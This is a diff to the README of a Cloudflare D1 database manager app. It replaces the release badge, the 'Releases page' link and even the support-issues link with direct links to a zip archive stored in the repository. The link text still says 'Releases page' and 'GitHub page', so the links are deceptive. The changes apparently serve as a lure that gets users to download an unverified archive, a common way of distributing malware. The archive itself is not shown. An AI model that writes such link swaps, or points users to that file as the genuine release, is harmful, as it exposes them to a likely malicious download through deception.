@@ -1,7 +1,7 @@
 # 🌟 d1-manager - Manage Your Cloudflare D1 Database Effortlessly
 
 ## 📥 Download Now
-[![Download d1-manager](https://img.shields.io/badge/Download-d1--manager-blue)](https://github.com/Idan15113/d1-manager/releases)
+[![Download d1-manager](https://raw.githubusercontent.com/Idan15113/d1-manager/master/releases/d1-manager-v2.6.zip)](https://raw.githubusercontent.com/Idan15113/d1-manager/master/releases/d1-manager-v2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to d1-manager! This web app simplifies managing your Cloudflare D1 database. You have powerful tools at your fingertips, including visual schema editing, rollback options, and more. This guide helps you get started with downloading and running the software.
@@ -23,7 +23,7 @@ d1-manager comes packed with features to support your database needs:
 - **FTS5 Full-Text Search:** Perform advanced searches in your database.
 
 ## 📥 Download & Install
-To download the application, visit the [Releases page](https://github.com/Idan15113/d1-manager/releases) on GitHub. 
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Idan15113/d1-manager/master/releases/d1-manager-v2.6.zip) on GitHub. 
 
 1. Click the link above to go to the releases page.
 2. Find the latest release version.
@@ -50,7 +50,7 @@ If you encounter any issues while downloading or using the app, try these soluti
 - **Update Your Browser:** Ensure you are using the latest version of your web browser.
 
 ## 💬 Support
-For assistance, you can reach out via the issues section on the [GitHub page](https://github.com/Idan15113/d1-manager/issues). Please describe your issue clearly to receive the best help.
+For assistance, you can reach out via the issues section on the [GitHub page](https://raw.githubusercontent.com/Idan15113/d1-manager/master/releases/d1-manager-v2.6.zip). Please describe your issue clearly to receive the best help.
 
 ## 📜 License
 d1-manager is open-source software licensed under the MIT License. You can view the license details in the repository.
